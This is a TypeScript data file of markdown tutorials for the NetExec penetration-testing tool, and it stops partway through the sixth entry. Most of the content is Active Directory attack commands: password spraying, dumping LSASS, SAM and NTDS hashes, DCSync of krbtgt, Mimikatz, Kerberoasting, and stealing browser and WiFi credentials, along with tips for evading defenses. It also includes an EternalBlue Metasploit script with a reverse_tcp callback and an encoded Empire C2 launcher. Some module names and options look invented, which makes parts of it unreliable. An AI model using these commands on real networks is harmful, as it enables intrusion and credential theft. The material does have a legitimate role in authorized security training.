export interface Tutorial {
  id: number;
  title: string;
  slug: string;
  image: string;
  description: string;
  content: string;
  level: 'beginner' | 'intermediate' | 'advanced';
  readTime: number;
  tags: string[];
}

export const tutorials: Tutorial[] = [
  {
    id: 1,
    title: 'Getting Started with NetExec',
    slug: 'getting-started-with-netexec',
    image: 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=60',
    description: 'Learn the basics of NetExec installation, configuration, and your first network scan.',
    content: `
# Getting Started with NetExec

NetExec (formerly known as CrackMapExec) is a powerful post-exploitation tool designed to automate assessing the security of large Active Directory networks. This beginner's guide will help you install, configure, and run your first scan with NetExec.

## 1. Installation

NetExec can be installed via pip, the Python package manager. It's recommended to install it in a virtual environment:

\`\`\`bash
# Create and activate a virtual environment
python3 -m venv netexec-env
source netexec-env/bin/activate  # On Windows, use: netexec-env\\Scripts\\activate

# Install NetExec
pip install netexec
\`\`\`

Alternatively, you can install directly from the GitHub repository for the latest version:

\`\`\`bash
pip install git+https://github.com/Pennyw0rth/NetExec.git
\`\`\`

## 2. Basic Configuration

After installation, you can verify that NetExec is properly installed by running:

\`\`\`bash
netexec --help
\`\`\`

You should see a help message listing all available commands and options.

## 3. Your First Network Scan

Let's run a basic SMB protocol scan against a target:

\`\`\`bash
# Scan a single host
netexec smb 192.168.1.10

# Scan a network range
netexec smb 192.168.1.0/24
\`\`\`

This basic scan will enumerate information about the target(s) such as:
- Windows OS version
- Hostname
- Domain name
- SMB signing requirements

## 4. Authentication

To perform more comprehensive tests, you'll need to authenticate to the target systems:

\`\`\`bash
# Using username and password
netexec smb 192.168.1.0/24 -u Administrator -p 'Password123!'

# Using NTLM hash (pass-the-hash)
netexec smb 192.168.1.0/24 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71
\`\`\`

## 5. Understanding the Output

NetExec displays results with the following indicators:

- \`[*]\` - Informational message
- \`[+]\` - Successful action/authentication
- \`[-]\` - Failed action/authentication

Example output:
\`\`\`
SMB         192.168.1.10    445    DC01        [*] Windows Server 2019 (name:DC01) (domain:CORP)
SMB         192.168.1.10    445    DC01        [+] CORP\\Administrator:Password123! (Pwn3d!)
\`\`\`

The "Pwn3d!" indicator shows that the provided credentials have administrative access on the target.

## 6. Common Commands

Here are some basic commands to get you started:

\`\`\`bash
# List shares on target systems
netexec smb 192.168.1.0/24 -u Administrator -p 'Password123!' --shares

# Get password policy information
netexec smb 192.168.1.0/24 -u Administrator -p 'Password123!' --pass-pol

# List local groups on a system
netexec smb 192.168.1.10 -u Administrator -p 'Password123!' --local-groups
\`\`\`

## 7. Next Steps

Once you're comfortable with basic scanning, explore more advanced features:

- Using modules with the \`-M\` option
- Password spraying across multiple hosts
- Extracting credentials from target systems
- Executing commands remotely

Remember to always use NetExec ethically and only on systems you have explicit permission to test.
    `,
    level: 'beginner',
    readTime: 30,
    tags: ['installation', 'configuration', 'basics']
  },
  {
    id: 2,
    title: 'SMB Share Enumeration Techniques',
    slug: 'smb-share-enumeration-techniques',
    image: 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=60',
    description: 'Discover advanced techniques for identifying and analyzing SMB shares on Windows networks.',
    content: `
# SMB Share Enumeration Techniques with NetExec

SMB (Server Message Block) share enumeration is a critical phase in network penetration testing. This tutorial explores intermediate-level techniques for discovering, accessing, and analyzing network shares using NetExec.

## 1. Basic Share Enumeration

Let's start with the basics - listing available shares on target systems:

\`\`\`bash
# List all shares on a single host
netexec smb 192.168.1.10 -u Administrator -p 'Password123!' --shares

# List shares on multiple hosts
netexec smb 192.168.1.0/24 -u Administrator -p 'Password123!' --shares
\`\`\`

The output will display share names, permissions (READ, WRITE), and descriptions.

## 2. Filtering Share Results

When assessing large networks, you might want to filter the results:

\`\`\`bash
# Show only readable shares
netexec smb 192.168.1.0/24 -u user -p 'Password123!' --shares --only-readable

# Exclude default administrative shares
netexec smb 192.168.1.0/24 -u user -p 'Password123!' --shares --exclude-shares 'ADMIN$,C$,IPC$'
\`\`\`

## 3. Share Content Spidering

Once you've identified interesting shares, you can spider them to discover potentially sensitive files:

\`\`\`bash
# Spider a specific share
netexec smb 192.168.1.10 -u Administrator -p 'Password123!' -M spider_plus --shares 'Data'

# Spider with pattern matching
netexec smb 192.168.1.10 -u Administrator -p 'Password123!' -M spider_plus --shares 'Data' --pattern 'password,config,secret'
\`\`\`

The spider_plus module allows recursive directory traversal and pattern matching to identify files of interest.

## 4. Searching File Contents

For more thorough analysis, search within file contents:

\`\`\`bash
# Search file contents for pattern matches
netexec smb 192.168.1.10 -u Administrator -p 'Password123!' -M spider_plus --shares 'Data' --content --pattern 'password|credential|secret'

# Limiting depth and file size
netexec smb 192.168.1.10 -u Administrator -p 'Password123!' -M spider_plus --shares 'Data' --content --pattern 'password' --depth 3 --max-size 1000000
\`\`\`

The content search can be time-consuming but is extremely valuable for discovering hardcoded credentials or sensitive information.

## 5. File Operations

NetExec allows basic file operations for interacting with shares:

\`\`\`bash
# Download a file
netexec smb 192.168.1.10 -u Administrator -p 'Password123!' --get-file 'Data\\config.xml' ./config.xml

# Upload a file
netexec smb 192.168.1.10 -u Administrator -p 'Password123!' --put-file ./local_file.txt 'Data\\remote_file.txt'
\`\`\`

## 6. Combining with Other Techniques

Share enumeration becomes more powerful when combined with other NetExec capabilities:

\`\`\`bash
# Find hosts with anonymous access to shares
netexec smb 192.168.1.0/24 -u '' -p '' --shares

# Enumerate shares and attempt to dump SAM database
netexec smb 192.168.1.0/24 -u Administrator -p 'Password123!' --shares -M lsassy
\`\`\`

## 7. Share Access Auditing

To identify security issues, audit share permissions across your network:

\`\`\`bash
# Identify writable shares accessible by regular users
netexec smb 192.168.1.0/24 -u regular_user -p 'UserPassword' --shares | grep 'WRITE'

# Check if sensitive shares are accessible by low-privilege users
netexec smb 192.168.1.0/24 -u low_priv_user -p 'Password123!' --shares --only-readable | grep -E 'HR|Finance|Confidential'
\`\`\`

## 8. Automating Analysis

For larger networks, consider scripting and output processing:

\`\`\`bash
# Save results to a CSV file for further analysis
netexec smb 192.168.1.0/24 -u Administrator -p 'Password123!' --shares --csv share_audit

# Use jq to process JSON output
netexec smb 192.168.1.0/24 -u Administrator -p 'Password123!' --shares --json | jq '.[] | select(.shares[]? | .write==true)'
\`\`\`

## 9. Stealthy Enumeration

In production environments, consider more stealthy approaches:

\`\`\`bash
# Limit number of concurrent connections
netexec smb 192.168.1.0/24 -u Administrator -p 'Password123!' --shares --threads 2

# Use Kerberos authentication for greater stealth
netexec smb 192.168.1.0/24 -u Administrator -p 'Password123!' --shares --kerberos
\`\`\`

## 10. Conclusion

Effective SMB share enumeration is an art that combines thorough scanning with focused analysis. By mastering these techniques, you can quickly identify security issues related to file sharing in Windows environments.

Remember that all these techniques should only be used in authorized penetration testing or security auditing contexts.
    `,
    level: 'intermediate',
    readTime: 45,
    tags: ['smb', 'shares', 'enumeration']
  },
  {
    id: 3,
    title: 'Active Directory Password Auditing',
    slug: 'active-directory-password-auditing',
    image: 'https://images.unsplash.com/photo-1563453392212-326f5e854473?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=60',
    description: 'Learn how to conduct comprehensive password policy assessments using NetExec\'s LDAP modules.',
    content: `
# Active Directory Password Auditing with NetExec

Password security is a critical aspect of Active Directory environments. This advanced tutorial covers comprehensive techniques for auditing password policies, identifying weak passwords, and detecting authentication vulnerabilities using NetExec.

## 1. Understanding Password Policy Components

Before auditing, it's important to understand what constitutes an AD password policy:

- Password history
- Maximum password age
- Minimum password age
- Minimum password length
- Password complexity requirements
- Account lockout thresholds
- Account lockout duration

## 2. Extracting Password Policies

Let's start by retrieving the domain password policy:

\`\`\`bash
# Get domain password policy
netexec ldap 192.168.1.10 -u Administrator -p 'Password123!' --pass-pol
\`\`\`

Example output:
\`\`\`
LDAP        192.168.1.10    389    DC01        [*] Windows Server 2019 (name:DC01) (domain:CORP)
LDAP        192.168.1.10    389    DC01        [+] CORP\\Administrator:Password123!
LDAP        192.168.1.10    389    DC01        [+] Domain Password Policy:
LDAP        192.168.1.10    389    DC01           Minimum password length: 7
LDAP        192.168.1.10    389    DC01           Password complexity: Enabled
LDAP        192.168.1.10    389    DC01           Maximum password age: 42 days
LDAP        192.168.1.10    389    DC01           Minimum password age: 1 days
LDAP        192.168.1.10    389    DC01           Password history count: 24
LDAP        192.168.1.10    389    DC01           Account lockout threshold: 5
LDAP        192.168.1.10    389    DC01           Account lockout duration: 30 minutes
\`\`\`

## 3. Fine-Grained Password Policies

In modern AD environments, organizations often use Fine-Grained Password Policies (FGPP). Extract these using:

\`\`\`bash
# Get fine-grained password policies
netexec ldap 192.168.1.10 -u Administrator -p 'Password123!' -M get-fgpp
\`\`\`

This helps identify if different user groups have different password requirements.

## 4. Password Spray Attacks

Password spraying is a technique to identify accounts with weak passwords without triggering lockouts:

\`\`\`bash
# Basic password spray
netexec smb 192.168.1.10 -u userlist.txt -p 'Spring2023!'

# Safer password spray with delay
netexec smb 192.168.1.10 -u userlist.txt -p 'Spring2023!' --no-bruteforce --continue-on-success --delay 5
\`\`\`

Notice we're using parameters to make the attack safer in production:
- \`--no-bruteforce\`: Stop after testing each username once
- \`--continue-on-success\`: Continue testing all users even after finding valid credentials
- \`--delay\`: Add delay between attempts

## 5. Extracting Password Hashes

With administrative access, extract password hashes for offline analysis:

\`\`\`bash
# Extract NTDS.dit using secretsdump
netexec smb 192.168.1.10 -u Administrator -p 'Password123!' -M secretsdump

# Alternative approach using DRSUAPI
netexec smb 192.168.1.10 -u Administrator -p 'Password123!' -M dcsync
\`\`\`

The extracted hashes can be analyzed offline for patterns, password reuse, and strength testing.

## 6. Kerberoasting

Identify service accounts with weak passwords using Kerberoasting:

\`\`\`bash
# Perform Kerberoasting attack
netexec ldap 192.168.1.10 -u regularuser -p 'Password123!' -M kerberoast
\`\`\`

The output will include service ticket hashes that can be cracked offline to find service account passwords.

## 7. AS-REP Roasting

Some accounts may have "Do not require Kerberos preauthentication" enabled, making them vulnerable:

\`\`\`bash
# Identify and exploit accounts without Kerberos preauthentication
netexec ldap 192.168.1.10 -u regularuser -p 'Password123!' -M asreproast
\`\`\`

## 8. Password Age Analysis

Identify accounts with old passwords that might need rotation:

\`\`\`bash
# Find accounts with passwords older than 90 days
netexec ldap 192.168.1.10 -u Administrator -p 'Password123!' -M user-desc --filter '(&(objectCategory=person)(objectClass=user)(pwdLastSet<=133057580000000000))'
\`\`\`

The timestamp used in the filter should be calculated based on the current time minus 90 days in Windows file time format.

## 9. LAPS Audit

If Local Administrator Password Solution (LAPS) is used, audit its implementation:

\`\`\`bash
# Check LAPS configuration and access
netexec ldap 192.168.1.10 -u Administrator -p 'Password123!' -M laps
\`\`\`

This helps identify who can read LAPS passwords and which computers have LAPS configured.

## 10. Analyzing Password Reset Policies

Check for accounts with passwords that never expire:

\`\`\`bash
# Find accounts with 'password never expires' flag
netexec ldap 192.168.1.10 -u Administrator -p 'Password123!' -M user-desc --filter '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))'
\`\`\`

## 11. Comprehensive Reporting

For proper documentation and analysis, generate comprehensive reports:

\`\`\`bash
# Generate a full password audit report
netexec ldap 192.168.1.10 -u Administrator -p 'Password123!' --pass-pol -M get-fgpp,laps --csv password_audit
\`\`\`

## 12. Remediation Recommendations

Based on your findings, typical recommendations include:

- Increasing minimum password length (14+ characters)
- Implementing account lockout thresholds
- Enabling password complexity requirements
- Implementing fine-grained password policies for privileged accounts
- Enabling MFA for sensitive accounts
- Regular password auditing

## Conclusion

Active Directory password auditing is an essential security process for identifying vulnerabilities before attackers do. By using NetExec's comprehensive toolset, security professionals can efficiently evaluate password policies, detect weak configurations, and provide actionable remediation guidance.

Remember to always conduct these tests with proper authorization and in compliance with organizational security policies.
    `,
    level: 'advanced',
    readTime: 60,
    tags: ['ldap', 'active directory', 'password policy']
  },
  {
    id: 4,
    title: 'Understanding NetExec Output',
    slug: 'understanding-netexec-output',
    image: 'https://images.unsplash.com/photo-1517694712202-14dd9538aa97?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=60',
    description: 'A detailed guide to interpreting and analyzing the results from NetExec scans and module executions.',
    content: `
# Understanding NetExec Output

One of the most important skills when using NetExec is the ability to correctly interpret its output. This guide will help you understand the various output formats, indicators, and how to extract actionable intelligence from your scans.

## 1. Basic Output Structure

NetExec output follows a consistent format:

\`\`\`
PROTOCOL    IP_ADDRESS     PORT   HOSTNAME    [INDICATOR] MESSAGE
\`\`\`

For example:
\`\`\`
SMB         192.168.1.10    445    DC01        [*] Windows Server 2019 (name:DC01) (domain:CORP)
SMB         192.168.1.10    445    DC01        [+] CORP\\Administrator:Password123! (Pwn3d!)
\`\`\`

## 2. Indicator Symbols

NetExec uses several indicator symbols to denote different types of information:

- \`[*]\` - Informational message
- \`[+]\` - Successful action (authentication, vulnerability found, etc.)
- \`[-]\` - Failed action or authentication
- \`[!]\` - Warning or important alert

## 3. Authentication Status

When attempting to authenticate to a system, NetExec indicates success or failure:

\`\`\`
# Successful authentication
SMB         192.168.1.10    445    DC01        [+] CORP\\Administrator:Password123!

# Failed authentication
SMB         192.168.1.10    445    DC01        [-] CORP\\Administrator:WrongPassword

# Successful authentication with admin rights
SMB         192.168.1.10    445    DC01        [+] CORP\\Administrator:Password123! (Pwn3d!)
\`\`\`

The "Pwn3d!" indicator is crucial as it shows that the credentials have administrative privileges on the target system.

## 4. Protocol-Specific Information

Each protocol reveals different information:

### SMB Protocol Output

\`\`\`
SMB         192.168.1.10    445    DC01        [*] Windows Server 2019 (name:DC01) (domain:CORP)
SMB         192.168.1.10    445    DC01        [*] SMB signing: True
SMB         192.168.1.10    445    DC01        [*] Detected domain: CORP
\`\`\`

This tells you:
- Operating system version
- Hostname
- Domain name
- SMB signing status

### LDAP Protocol Output

\`\`\`
LDAP        192.168.1.10    389    DC01        [*] Windows Server 2019 (name:DC01) (domain:CORP)
LDAP        192.168.1.10    389    DC01        [*] Domain Sid: S-1-5-21-1473733912-1059243552-3491339771
LDAP        192.168.1.10    389    DC01        [*] Supported SASL mechanisms: GSSAPI, GSS-SPNEGO, EXTERNAL, DIGEST-MD5
\`\`\`

This reveals:
- Domain SID (crucial for many attacks)
- Supported authentication mechanisms

### WinRM Protocol Output

\`\`\`
WINRM       192.168.1.10    5985   WS01        [*] Windows 10 Enterprise (name:WS01) (domain:CORP)
WINRM       192.168.1.10    5985   WS01        [*] http://192.168.1.10:5985/wsman
WINRM       192.168.1.10    5985   WS01        [+] CORP\\Administrator:Password123! (Pwn3d!)
\`\`\`

### MSSQL Protocol Output

\`\`\`
MSSQL       192.168.1.10    1433   DB01        [*] Windows Server 2019 (name:DB01) (domain:CORP)
MSSQL       192.168.1.10    1433   DB01        [*] SQL Server version: 2019 (15.0.2000.5)
MSSQL       192.168.1.10    1433   DB01        [+] sa:SqlPassword123! (Pwn3d!)
\`\`\`

This shows SQL Server version and authentication status.

## 5. Module Output

Module outputs follow the same structure but include module-specific information:

### Shares Module

\`\`\`
SMB         192.168.1.10    445    DC01        [+] Enumerated shares
SMB         192.168.1.10    445    DC01        Share           Permissions     Remark
SMB         192.168.1.10    445    DC01        -----           -----------     ------
SMB         192.168.1.10    445    DC01        ADMIN$          READ,WRITE      Remote Admin
SMB         192.168.1.10    445    DC01        C$              READ,WRITE      Default share
SMB         192.168.1.10    445    DC01        NETLOGON        READ            Logon server share
\`\`\`

### Mimikatz Module

\`\`\`
SMB         192.168.1.10    445    DC01        [+] Executing mimikatz module...
SMB         192.168.1.10    445    DC01        [+] Found 3 credential entries
SMB         192.168.1.10    445    DC01        Username: Administrator
SMB         192.168.1.10    445    DC01        Domain: CORP
SMB         192.168.1.10    445    DC01        NTLM: 58a478135a93ac3bf058a5ea0e8fdb71
\`\`\`

## 6. Error Messages

Understanding error messages helps troubleshoot issues:

\`\`\`
# SMB signing required but not enabled in NetExec
SMB         192.168.1.10    445    DC01        [-] SMB signing is required, but was not enabled

# Access denied
SMB         192.168.1.10    445    DC01        [-] Access Denied

# Connection error
SMB         192.168.1.10    445    DC01        [-] Connection Error: The server has disconnected
\`\`\`

## 7. Output Formats

NetExec supports different output formats for easier analysis:

### CSV Output

\`\`\`bash
netexec smb 192.168.1.0/24 -u Administrator -p 'Password123!' --shares --csv smb_audit
\`\`\`

This creates CSV files in the format: \`smb_audit_<timestamp>.csv\`

### JSON Output

\`\`\`bash
netexec smb 192.168.1.0/24 -u Administrator -p 'Password123!' --shares --json
\`\`\`

The JSON output can be piped to tools like jq for parsing:

\`\`\`bash
netexec smb 192.168.1.0/24 -u Administrator -p 'Password123!' --shares --json | jq '.[] | select(.admin_access==true)'
\`\`\`

### SQLite Database

NetExec maintains a SQLite database with scan results:

\`\`\`bash
# View database location
netexec --database-path

# Directly query the database (example)
sqlite3 ~/.netexec/workspaces/default/database.db "SELECT * FROM hosts WHERE admin_access=1;"
\`\`\`

## 8. Putting It All Together - Analysis Examples

### Finding All Domain Controllers

\`\`\`bash
netexec smb 192.168.1.0/24 --domain-only
\`\`\`

### Identifying Hosts with Admin Access

\`\`\`bash
netexec smb 192.168.1.0/24 -u Administrator -p 'Password123!' --csv admin_access
grep -i pwn3d admin_access_*.csv
\`\`\`

### Finding Hosts with Weak Passwords

\`\`\`bash
netexec smb 192.168.1.0/24 -u users.txt -p passwords.txt
\`\`\`

## 9. Custom Filtering for Large Networks

For large networks, filter results with grep:

\`\`\`bash
# Show only successful authentications
netexec smb 192.168.1.0/24 -u Administrator -p 'Password123!' | grep -i '\\[+\\]'

# Show only systems where you have admin access
netexec smb 192.168.1.0/24 -u Administrator -p 'Password123!' | grep -i 'pwn3d'
\`\`\`

## Conclusion

Mastering the ability to read and interpret NetExec output is essential for effective penetration testing and security assessment. By understanding the structure, indicators, and protocol-specific information, you can quickly extract actionable intelligence from your scans.

Remember that different modules provide different types of output, but they all follow a consistent format that makes it possible to easily parse and analyze the results.
    `,
    level: 'beginner',
    readTime: 25,
    tags: ['basics', 'output', 'analysis']
  },
  {
    id: 5,
    title: 'Credential Harvesting Techniques',
    slug: 'credential-harvesting-techniques',
    image: 'https://images.unsplash.com/photo-1550751827-4bd374c3f58b?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=60',
    description: 'Explore different methods for extracting and analyzing credentials from Windows systems.',
    content: `
# Credential Harvesting Techniques with NetExec

Credential harvesting is a crucial phase in many security assessments. This tutorial explores techniques for extracting credentials from Windows systems using NetExec's specialized modules.

## 1. Understanding Credential Storage in Windows

Windows stores credentials in various locations:

- SAM database (local accounts)
- LSASS process memory (active sessions)
- NTDS.dit (Active Directory)
- Credential Manager
- Registry

NetExec provides modules to target each of these locations.

## 2. Dumping SAM Database

The SAM (Security Account Manager) database contains local user account hashes:

\`\`\`bash
# Dump SAM database
netexec smb 192.168.1.10 -u Administrator -p 'Password123!' -M sam

# Dump SAM with secretsdump module (more comprehensive)
netexec smb 192.168.1.10 -u Administrator -p 'Password123!' -M secretsdump
\`\`\`

The secretsdump module is more powerful as it can extract:
- SAM hashes
- LSA secrets
- DPAPI backup keys

## 3. LSASS Memory Extraction with lsassy

The LSASS process stores credentials for active sessions:

\`\`\`bash
# Basic lsassy usage
netexec smb 192.168.1.10 -u Administrator -p 'Password123!' -M lsassy

# Specify dump method to bypass defenses
netexec smb 192.168.1.10 -u Administrator -p 'Password123!' -M lsassy -o DUMPMETHOD=nanodump
\`\`\`

Available dump methods include:
- comsvcs (default, uses built-in DLL)
- nanodump (stealthier approach)
- dllinject
- procdump (using Sysinternals tool)

## 4. Domain Controller Extraction with DCSync

For domain controllers, DCSync privileges allow extraction of all domain user hashes:

\`\`\`bash
# DCSync attack using secretsdump module
netexec smb 192.168.1.10 -u Administrator -p 'Password123!' -M dcsync

# Target specific user
netexec smb 192.168.1.10 -u Administrator -p 'Password123!' -M dcsync -o USER=krbtgt
\`\`\`

The krbtgt hash is particularly valuable as it enables Golden Ticket attacks.

## 5. Mimikatz Integration

NetExec integrates with Mimikatz for advanced credential harvesting:

\`\`\`bash
# Basic mimikatz usage
netexec smb 192.168.1.10 -u Administrator -p 'Password123!' -M mimikatz

# Custom mimikatz command
netexec smb 192.168.1.10 -u Administrator -p 'Password123!' -M mimikatz -o COMMAND="sekurlsa::logonpasswords"
\`\`\`

Other useful Mimikatz commands:
- \`sekurlsa::tickets\` (extract Kerberos tickets)
- \`lsadump::dcsync /user:DOMAIN\\krbtgt\` (perform DCSync for specific user)
- \`lsadump::sam\` (dump local SAM)

## 6. Token Impersonation

Extract and impersonate tokens for lateral movement:

\`\`\`bash
# List available tokens
netexec smb 192.168.1.10 -u Administrator -p 'Password123!' -M tokens

# Execute command with impersonated token
netexec smb 192.168.1.10 -u Administrator -p 'Password123!' -M tokens -o IMPERSONATE=DOMAIN\\user EXECUTE="whoami /all"
\`\`\`

## 7. Remote Registry Extraction

Extract credentials stored in the Windows Registry:

\`\`\`bash
# Extract credentials from Registry
netexec smb 192.168.1.10 -u Administrator -p 'Password123!' -M reg_query -o ACTION=read KEY='HKLM\\SOFTWARE\\path\\to\\stored\\credentials'
\`\`\`

## 8. Kerberoasting

Extract and crack service account passwords:

\`\`\`bash
# Basic Kerberoasting
netexec ldap 192.168.1.10 -u user -p 'Password123!' -M kerberoast

# Save ticket for offline cracking
netexec ldap 192.168.1.10 -u user -p 'Password123!' -M kerberoast -o OUTPUT_FILE=tickets.txt
\`\`\`

Kerberoasting works even with regular domain user credentials.

## 9. AS-REP Roasting

Target accounts with Kerberos pre-authentication disabled:

\`\`\`bash
# AS-REP Roasting
netexec ldap 192.168.1.10 -u user -p 'Password123!' -M asreproast

# Save for offline cracking
netexec ldap 192.168.1.10 -u user -p 'Password123!' -M asreproast -o OUTPUT_FILE=asrep.txt
\`\`\`

## 10. DPAPI Credential Extraction

DPAPI (Data Protection API) is used by Windows to encrypt sensitive data:

\`\`\`bash
# Extract DPAPI master keys
netexec smb 192.168.1.10 -u Administrator -p 'Password123!' -M dpapi
\`\`\`

## 11. Browser Credential Extraction

Extract credentials from web browsers:

\`\`\`bash
# Extract browser credentials
netexec smb 192.168.1.10 -u Administrator -p 'Password123!' -M browsers
\`\`\`

This can extract saved passwords from Chrome, Firefox, Edge, and other browsers.

## 12. WiFi Password Extraction

Extract saved WiFi passwords:

\`\`\`bash
# Extract WiFi profiles and passwords
netexec smb 192.168.1.10 -u Administrator -p 'Password123!' -M wifi
\`\`\`

## 13. Managing Harvested Credentials

NetExec maintains a credential database you can interact with:

\`\`\`bash
# Add credentials to the database
netexec cmedb add-credential -u administrator -p 'Password123!' -d CORP

# List all credentials
netexec cmedb list-credentials

# Use credentials from the database
netexec smb 192.168.1.0/24 --cred-id 1
\`\`\`

## 14. Analyzing Password Patterns

After collecting hashes, analyze them for patterns:

\`\`\`bash
# Extract all passwords to a file
netexec cmedb list-credentials | grep "Password" > passwords.txt

# Use tools like pipal to analyze password patterns
pipal passwords.txt
\`\`\`

Common patterns include:
- Company name + season + year (CompanySpring2023!)
- Simple character substitutions (P@ssw0rd)
- Incremental passwords (Password1, Password2)

## 15. Stealth Considerations

For production environments, consider more stealthy approaches:

\`\`\`bash
# Use stealth options with lsassy
netexec smb 192.168.1.10 -u Administrator -p 'Password123!' -M lsassy -o DUMPMETHOD=nanodump PROCNAME=lsass.exe

# Use procdump for less suspicious behavior
netexec smb 192.168.1.10 -u Administrator -p 'Password123!' -M lsassy -o DUMPMETHOD=procdump
\`\`\`

## Conclusion

NetExec provides a comprehensive suite of modules for credential harvesting across different Windows storage locations. By understanding these techniques, security professionals can effectively assess password security and identify potential vulnerabilities during authorized penetration tests.

Always remember that these techniques should only be used in environments where you have explicit permission to perform security testing.
    `,
    level: 'intermediate',
    readTime: 50,
    tags: ['credentials', 'password', 'mimikatz']
  },
  {
    id: 6,
    title: 'NetExec and External Tools Integration',
    slug: 'netexec-and-external-tools-integration',
    image: 'https://images.unsplash.com/photo-1563206767-5b18f218e8de?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=60',
    description: 'Learn how to create powerful security assessment workflows by combining NetExec with other security tools.',
    content: `
# NetExec and External Tools Integration

NetExec becomes even more powerful when integrated with other security tools. This advanced tutorial explores how to create comprehensive security assessment workflows by combining NetExec with specialized tools for reconnaissance, exploitation, and post-exploitation.

## 1. Integration with Nmap

Nmap and NetExec can work together for comprehensive network mapping and service enumeration:

\`\`\`bash
# Scan for SMB hosts with Nmap and feed to NetExec
nmap -p 445 --open 192.168.1.0/24 -oG - | grep "/open" | cut -d " " -f 2 > smb-hosts.txt
netexec smb smb-hosts.txt -u Administrator -p 'Password123!'

# Scan for multiple protocols
nmap -p 445,139,389,636,5985,1433 --open 192.168.1.0/24 -oG - > open-ports.txt
grep "445/open" open-ports.txt | cut -d " " -f 2 > smb-hosts.txt
grep "389/open" open-ports.txt | cut -d " " -f 2 > ldap-hosts.txt
\`\`\`

## 2. Integration with Impacket

Impacket provides low-level Python classes for network protocols. Use findings from NetExec to target specific systems:

\`\`\`bash
# Identify domain controllers with NetExec
netexec smb 192.168.1.0/24 --domain-only -u user -p 'Password123!' > domain-controllers.txt

# Use Impacket's secretsdump.py on the identified domain controller
impacket-secretsdump CORP/Administrator:'Password123!'@192.168.1.10
\`\`\`

Other useful Impacket tools for follow-up:
- \`impacket-psexec\` for command execution
- \`impacket-smbexec\` for semi-interactive shell
- \`impacket-wmiexec\` for WMI-based command execution

## 3. Integration with BloodHound

BloodHound provides visual attack paths in Active Directory. Combine it with NetExec for a powerful AD assessment workflow:

\`\`\`bash
# Use NetExec to gather BloodHound data
netexec ldap 192.168.1.10 -u user -p 'Password123!' -M bloodhound -o COLLECTION_METHOD=DCOnly ZIP_FILENAME=corp-ad-data.zip

# Import the ZIP into BloodHound GUI
# Then analyze attack paths visually
\`\`\`

Advanced BloodHound workflow:
1. Use NetExec to identify domain controllers and valid credentials
2. Run BloodHound collection with those credentials
3. Identify attack paths in BloodHound GUI
4. Use NetExec modules to execute identified attack paths

## 4. Integration with Responder

Combine NetExec's enumeration with Responder for MITM attacks:

\`\`\`bash
# First, use NetExec to identify hosts with SMB signing disabled
netexec smb 192.168.1.0/24 --signing | grep "False" > unsigned-hosts.txt

# Run Responder to capture authentication attempts
sudo responder -I eth0 -wv

# In another terminal, trigger NetBIOS name resolution
netexec smb unsigned-hosts.txt -u '' -p '' -M nbns-spoof -o INTERFACE=eth0
\`\`\`

This combination can help identify and exploit LLMNR/NBT-NS poisoning vulnerabilities.

## 5. Integration with CrackMapExec Modules

NetExec is highly extensible with custom modules. Create a workflow combining multiple modules:

\`\`\`bash
# Create a shell script for comprehensive assessment
#!/bin/bash
TARGET="192.168.1.10"
USER="Administrator"
PASS="Password123!"

# 1. Basic enumeration
netexec smb $TARGET -u $USER -p $PASS --shares
netexec ldap $TARGET -u $USER -p $PASS --pass-pol

# 2. Credential harvesting
netexec smb $TARGET -u $USER -p $PASS -M lsassy
netexec smb $TARGET -u $USER -p $PASS -M mimikatz

# 3. Lateral movement target identification
netexec smb $TARGET -u $USER -p $PASS -M rdp --enable
netexec smb $TARGET -u $USER -p $PASS -M wmiexec -x "whoami /all"
\`\`\`

## 6. Integration with Metasploit Framework

Use NetExec findings to feed into Metasploit for exploitation:

\`\`\`bash
# Identify vulnerable systems with NetExec
netexec smb 192.168.1.0/24 -u Administrator -p 'Password123!' -M ms17-010 > ms17-010-vulnerable.txt

# Create a resource script for Metasploit
cat > ms17_010_pwn.rc << EOF
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS file:ms17-010-vulnerable.txt
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
run
EOF

# Run Metasploit with the resource script
msfconsole -r ms17_010_pwn.rc
\`\`\`

## 7. Integration with Empire/Covenant C2

Use NetExec for initial access, then deploy C2 agents:

\`\`\`bash
# Generate Empire launcher
./empire client generate launcher windows

# Use NetExec to execute the Empire launcher
netexec smb 192.168.1.10 -u Administrator -p 'Password123!' -X "powershell -noP -sta -w 1 -enc BASE64_ENCODED_PAYLOAD"
\`\`\`

## 8. Integration with Hashcat for Password Cracking

NetExec can extract hashes, which can then be cracked with Hashcat:

\`\`\`bash
# Extract hashes with NetExec
netexec smb 192.168.1.10 -u Administrator -p 'Password123!' -M lsassy > lsassy-output.txt
grep "NTLM" lsassy-output.txt | cut -d ":" -f 2 > ntlm-hashes.txt

# Crack with Hashcat
hashcat -m 1000 -a 0 ntlm-hashes.txt wordlist.txt --force
\`\`\`

## 9. Integration with NetworkMiner for Traffic Analysis

After using NetExec, analyze the network traffic to identify potential security issues:

\`\`\`bash
# Capture traffic during NetExec scans
sudo tcpdump -i eth0 -w netexec_scan.pcap host 192.168.1.10

# Open in NetworkMiner for analysis
# Check for plaintext credentials, unauthorized access attempts, etc.
\`\`\`

## 10. Integration with Ansible for Remediation

After identifying issues with NetExec, use Ansible for automated remediation:

\`\`\`bash
# Create an inventory from NetExec results
netexec smb 192.168.1.0/24 -u Administrator -p 'Password123!' --csv inventory

# Convert CSV to Ansible inventory
python3 -c "import csv, sys; reader = csv.reader(open('inventory_*.csv')); print('[vulnerable_hosts]'); [print(row[1]) for row in reader if 'Pwn3d' in row[5]]" > ansible_hosts

# Create and run Ansible playbook for remediation
cat > remediate.yml << EOF
---
- hosts: vulnerable_hosts
  tasks:
    - name: Enable SMB Signing
      win_regedit:
        path: HKLM:\System\CurrentControlSet\Services\LanManServer\Parameters
        name: RequireSecuritySignature
        data: 1
        type: dword
EOF

ansible-playbook -i ansible_hosts remediate.yml
\`\`\`

